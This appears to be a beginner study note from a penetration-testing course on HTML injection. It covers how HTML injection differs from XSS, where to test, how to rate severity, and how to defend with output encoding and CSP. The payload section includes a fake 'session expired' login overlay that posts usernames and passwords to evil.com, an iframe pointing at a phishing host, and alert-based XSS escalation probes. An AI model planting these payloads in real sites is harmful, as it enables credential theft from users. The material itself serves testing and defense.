---
tags: [vapt, injection, beginner]
difficulty: beginner
module: "10 - Injection Attacks"
topic: "10.04 HTML Injection"
---

# 10.04 — HTML Injection

## What is HTML Injection?

HTML Injection occurs when user input is embedded into an HTML page without encoding, allowing an attacker to inject arbitrary HTML tags. Unlike XSS, the injected HTML doesn't execute JavaScript — but it can still manipulate page content, create phishing overlays, and in some contexts escalate to XSS.

```
DIFFERENCE FROM XSS:
  XSS:            Inject <script>alert(1)</script> → JS executes
  HTML Injection: Inject <h1>Hacked</h1> → HTML renders, no JS
  
  HTML Injection CAN lead to:
  ✓ Page defacement
  ✓ Phishing overlays (fake login forms!)
  ✓ Misleading content that looks official
  ✓ Stored HTML injection → everyone sees defaced content
  ✗ Direct JS execution (need XSS for that)
```

---

## Basic HTML Injection Payloads

```html
<!-- SIMPLE PAGE DEFACEMENT: -->
<h1>YOU ARE HACKED</h1>
<img src="https://evil.com/hacked.png">

<!-- PHISHING OVERLAY: -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session Expired - Please Re-Login</h2>
  <form action="https://evil.com/steal" method="POST">
    Username: <input name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
  </form>
</div>

<!-- IFRAME INJECTION: -->
<iframe src="https://phishing.evil.com" width="100%" height="100%" frameborder="0"></iframe>

<!-- LINK INJECTION: -->
<a href="https://evil.com">Click here for your prize!</a>
```

---

## Difference from XSS

```
HTML INJECTION TEST:  <h1>Test</h1>
→ If page shows: TEST (big header) → HTML injection (not XSS)
→ Report as: HTML Injection (lower severity than XSS)

XSS TEST: <script>alert(1)</script>
→ If alert fires → XSS!
→ Report as: XSS (higher severity)

WHEN HTML INJECTION ESCALATES TO XSS:
  Some attributes in HTML tags allow JavaScript:
  <img src=x onerror=alert(1)>    ← onerror handler = XSS!
  <a href="javascript:alert(1)">  ← javascript: URI = XSS!
  <div onmouseover="alert(1)">    ← event handler = XSS!
  
  So HTML injection of these → XSS!
  These should always be tested even when basic <script> is blocked.
```

---

## Where to Test

```
HIGH-VALUE LOCATIONS:
  ✓ Comment sections / forums
  ✓ User profile bio / about me
  ✓ Username (appears in many places)
  ✓ Product reviews / ratings
  ✓ Search result display ("Results for: USER_INPUT")
  ✓ Error messages ("Username 'USER_INPUT' not found")
  ✓ Email confirmation messages shown in app
```

---

## Impact Assessment

```
SEVERITY: Low to Medium (HTML Injection alone)
           High (if escalated to XSS via event handlers)

HTML INJECTION IMPACTS:
  ✓ Phishing attack on other users (if stored)
  ✓ Page defacement
  ✓ SEO poisoning (in some contexts)
  ✓ Misleading content / fake warnings

XSS ESCALATION:
  If HTML injection allows:
  <img src=x onerror=alert(1)>    → SEVERITY: HIGH
  <a href="javascript:alert(1)">  → SEVERITY: HIGH
```

---

## Defense

```
ENCODE ALL OUTPUT:
  PHP:    htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
  Python: html.escape(input)
  Java:   StringEscapeUtils.escapeHtml4(input)
  .NET:   HttpUtility.HtmlEncode(input)
  
ENCODING MAP:
  < → &lt;
  > → &gt;
  & → &amp;
  " → &quot;
  ' → &#x27;

CSP: Content-Security-Policy: frame-src 'none'
→ Blocks injected iframes from loading external content
```

---

## Related Notes
- [[Module 07 - XSS]] — escalation from HTML injection to XSS
- [[05 - CSS Injection]] — CSS-based injection
- [[Module 09 - CSRF]] — combined attacks
